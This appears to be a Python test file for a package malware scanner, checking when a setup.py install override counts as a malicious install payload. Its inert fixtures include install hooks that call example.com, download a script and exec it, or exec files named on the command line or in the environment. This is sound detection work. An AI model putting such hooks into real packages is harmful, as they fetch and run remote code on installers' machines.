"""Census A (pypi-98): the decisions `InstallPayload.gate` makes for
`MALWARE.INSTALL.CONSUMER_CODE.001`.

A consumer-install override is the malicious install finding only when a payload is reachable from
the install code. These pin, with inert fixtures, that a compiler or a shipped *script* clears, a
shipped *native binary* or a real payload keeps, only CONSUMER_CODE is ever lowered, and a reachable
payload keeps it (the state that unparsable / unreachable install code fails closed into).
"""

from __future__ import annotations

import pathlib
import tempfile
from types import SimpleNamespace

from cordon_scanner import Scanner
from cordon_scanner.detect.code.install_payload import InstallPayload
from cordon_scanner.foundation.capabilities import Capability
from cordon_scanner.foundation.content import FileContent

CONSUMER_CODE = "MALWARE.INSTALL.CONSUMER_CODE.001"

#: A setup.py that overrides the consumer-install command. `{imp}` is imported, `{body}` runs inside
#: the override. Nothing here executes on a scan -- the scanner reads it.
_SETUP = """from setuptools import setup
from setuptools.command.install import install
import {imp}


class Install(install):
    def run(self):
        {body}
        install.run(self)


setup(name="demo", version="1.0", cmdclass={{"install": Install}})
"""

#: ELF magic plus padding: `BinaryDetector.identify` reads it as a native executable. The bytes run
#: nothing; they are a header and zeros.
_ELF = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 56


class Fixture:
    """Builds an inert package tree and returns the rule ids a scan reports. Stateless."""

    @staticmethod
    def rules(root: str) -> list[str]:
        return [f.rule_id for f in Scanner().scan(root).findings]

    @staticmethod
    def unit(content: FileContent | None, path: str = "setup.py") -> SimpleNamespace:
        """A stand-in for the FileUnit `gate` reads: it uses only `.content` and `.path`."""
        return SimpleNamespace(content=content, path=path)

    @staticmethod
    def ctx(native: frozenset[str] = frozenset()) -> SimpleNamespace:
        """A stand-in for the ScanContext `gate` reads: it uses only `.shipped_native_paths`."""
        return SimpleNamespace(shipped_native_paths=native)

    @staticmethod
    def build(tmp: str, imp: str, body: str, extra: dict[str, bytes] | None = None) -> str:
        root = pathlib.Path(tmp)
        root.mkdir(parents=True, exist_ok=True)
        (root / "setup.py").write_text(_SETUP.format(imp=imp, body=body), encoding="utf-8")
        for rel, content in (extra or {}).items():
            path = root / rel
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_bytes(content)
        return str(root)


class TestGateEndToEnd:
    """The whole chain: the engine computes `shipped_native_paths` and the install context, and the
    gate decides. Each case is one inert package."""

    def test_a_compiler_spawn_is_lowered(self) -> None:
        # (a) The install override spawns a system compiler by bare name: build work, not malware.
        with tempfile.TemporaryDirectory() as t:
            root = Fixture.build(t, "subprocess", 'subprocess.call(["cc", "-c", "x.c"])')
            assert CONSUMER_CODE not in Fixture.rules(root)

    def test_b_spawn_of_a_shipped_native_binary_is_kept(self) -> None:
        # (b) It spawns an ELF the package itself ships -- the author's own code, which no reader of
        # setup.py can see. Kept.
        with tempfile.TemporaryDirectory() as t:
            root = Fixture.build(
                t, "subprocess", 'subprocess.call(["./dist/helper"])', {"dist/helper": _ELF}
            )
            assert CONSUMER_CODE in Fixture.rules(root)

    def test_c_spawn_of_a_shipped_script_is_lowered(self) -> None:
        # (c) It spawns a shipped shell script, which the scanner reads on its own. Lowered.
        with tempfile.TemporaryDirectory() as t:
            root = Fixture.build(
                t,
                "subprocess",
                'subprocess.call(["./postinstall.sh"])',
                {"postinstall.sh": b"#!/bin/sh\necho building\n"},
            )
            assert CONSUMER_CODE not in Fixture.rules(root)

    def test_d_reachable_egress_is_kept(self) -> None:
        # (d) The install override reaches the network: a payload. Kept.
        with tempfile.TemporaryDirectory() as t:
            root = Fixture.build(
                t, "urllib.request", 'urllib.request.urlopen("http://example.com/x").read()'
            )
            assert CONSUMER_CODE in Fixture.rules(root)

    def test_f_a_payload_beside_a_compiler_spawn_is_kept(self) -> None:
        # (f) A compiler spawn alone would lower, but a payload anywhere in the install code keeps it.
        # CONSUMER_CODE is file-scoped, so a payload the install reaches -- the state that unparsable
        # or unprovable reachability fails closed into, counting the code as reached -- keeps it.
        with tempfile.TemporaryDirectory() as t:
            root = Fixture.build(
                t,
                "subprocess",
                'subprocess.call(["cc", "-c", "x.c"])\n'
                "        import urllib.request\n"
                '        urllib.request.urlopen("http://example.com/x").read()',
            )
            assert CONSUMER_CODE in Fixture.rules(root)


class TestGateUnit:
    """The gate's own decisions, independent of the engine."""

    def test_e_a_non_gated_malicious_finding_is_never_lowered(self) -> None:
        # (e) Only CONSUMER_CODE is gated. Another malicious finding -- even one whose only install
        # capability is a spawn -- is never lowered. The rule-id check short-circuits before the
        # unit and context are read, so they are untouched here.
        assert not InstallPayload.gate(
            "MALWARE.EXFIL.INSTALL_CALLBACK.001",
            True,
            {Capability.SPAWN},
            [],
            Fixture.unit(None),
            Fixture.ctx(),
        )

    def test_a_reachable_payload_capability_keeps_the_finding(self) -> None:
        # A payload capability short-circuits before the unit is read, so it is untouched.
        assert not InstallPayload.gate(
            CONSUMER_CODE, True, {Capability.EGRESS}, [], Fixture.unit(None), Fixture.ctx()
        )

    def test_a_spawn_only_window_with_nothing_shipped_is_lowered(self) -> None:
        unit = Fixture.unit(FileContent(path="setup.py", raw=b"", size=0))
        assert InstallPayload.gate(CONSUMER_CODE, True, {Capability.SPAWN}, [], unit, Fixture.ctx())

    def test_has_payload_truth_table(self) -> None:
        # Always a payload on its own.
        assert InstallPayload.has_payload({Capability.EGRESS})
        assert InstallPayload.has_payload({Capability.FETCH_EXEC})
        assert InstallPayload.has_payload({Capability.CREDENTIAL})
        # Never a payload on their own: build tools spawn compilers and write caches.
        assert not InstallPayload.has_payload({Capability.SPAWN})
        assert not InstallPayload.has_payload({Capability.PERSIST})
        assert not InstallPayload.has_payload({Capability.DELAY, Capability.FLOW})
        # A decode counts only together with a way to run what it produced.
        assert not InstallPayload.has_payload({Capability.DECODE})
        assert InstallPayload.has_payload({Capability.DECODE, Capability.EXECUTE})
        assert InstallPayload.has_payload({Capability.DECOMPRESS, Capability.DESERIALIZE})


class TestExecOfAFileThePackageShips:
    """F1 (reviews/pypi-98/24): `with open(<version file>) as f: exec(f.read())` in an install override runs text
    the package itself ships, which the scanner reads as part of the package; it is not a payload. The path has to
    be shown to be the package's own: a literal relative path, or one built from `__file__`, the working directory
    or other such literals. A path from argv, the environment, an attribute, a temp or download directory, an
    absolute or home path, or one the flow cannot resolve is sourced elsewhere and keeps the finding
    (`unsourced` alone says only that nothing was fetched or decoded, which is also true of an exec of a file
    named on the command line)."""

    @staticmethod
    def kept(path_expr: str, imp: str = "os") -> bool:
        body = f"with open({path_expr}) as f:\n            exec(f.read())"
        with tempfile.TemporaryDirectory() as t:
            return CONSUMER_CODE in Fixture.rules(Fixture.build(t, imp, body))

    def test_the_packages_own_version_file_is_not_a_payload(self) -> None:
        assert not self.kept('"version.py"')
        assert not self.kept('os.path.join("pkg", "version.py")')
        assert not self.kept('os.path.join(os.path.dirname(__file__), "pkg", "version.py")')
        assert not self.kept('os.path.join(os.path.abspath(os.path.dirname(__file__)), "_v.py")')

    def test_a_name_bound_to_the_packages_own_path_is_not_a_payload(self) -> None:
        body = (
            "here = os.path.abspath(os.path.dirname(__file__))\n"
            '        with open(os.path.join(here, "version.py")) as f:\n'
            "            exec(f.read())"
        )
        with tempfile.TemporaryDirectory() as t:
            assert CONSUMER_CODE not in Fixture.rules(Fixture.build(t, "os", body))

    def test_a_path_rewritten_by_convert_path_is_still_the_packages_own(self) -> None:
        body = (
            "here = os.path.dirname(__file__)\n"
            '        p = os.path.join(here, "version.py")\n'
            "        p = convert_path(p)\n"
            "        with open(p) as f:\n"
            "            exec(f.read())"
        )
        with tempfile.TemporaryDirectory() as t:
            root = Fixture.build(t, "os\nfrom distutils.util import convert_path", body)
            assert CONSUMER_CODE not in Fixture.rules(root)

    # The twins: each reads text that is not shown to be shipped, and keeps the finding.
    def test_a_path_from_argv_keeps_the_finding(self) -> None:
        assert self.kept("sys.argv[1]", imp="sys")

    def test_a_path_from_the_environment_keeps_the_finding(self) -> None:
        assert self.kept('os.environ["PAYLOAD"]')

    def test_a_path_in_a_temp_or_download_directory_keeps_the_finding(self) -> None:
        assert self.kept('os.path.join(tempfile.gettempdir(), "x.py")', imp="os, tempfile")

    def test_a_path_the_flow_cannot_resolve_keeps_the_finding(self) -> None:
        assert self.kept("self.target")
        assert self.kept("os.path.join(os.path.expanduser('~'), 'x.py')")
        assert self.kept('"/tmp/x.py"')
        assert self.kept("get_path()")

    def test_a_name_bound_to_an_outside_path_keeps_the_finding(self) -> None:
        body = "target = sys.argv[1]\n        with open(target) as f:\n            exec(f.read())"
        with tempfile.TemporaryDirectory() as t:
            assert CONSUMER_CODE in Fixture.rules(Fixture.build(t, "sys", body))

    def test_a_name_with_a_second_assignment_from_argv_keeps_the_finding(self) -> None:
        body = (
            'p = "version.py"\n'
            "        p = sys.argv[1]\n"
            "        with open(p) as f:\n"
            "            exec(f.read())"
        )
        with tempfile.TemporaryDirectory() as t:
            assert CONSUMER_CODE in Fixture.rules(Fixture.build(t, "sys", body))

    def test_a_download_then_exec_of_a_relative_path_keeps_the_finding(self) -> None:
        body = (
            'urllib.request.urlretrieve("http://example.com/x.py", "x.py")\n'
            '        with open("x.py") as f:\n'
            "            exec(f.read())"
        )
        with tempfile.TemporaryDirectory() as t:
            assert CONSUMER_CODE in Fixture.rules(Fixture.build(t, "urllib.request", body))
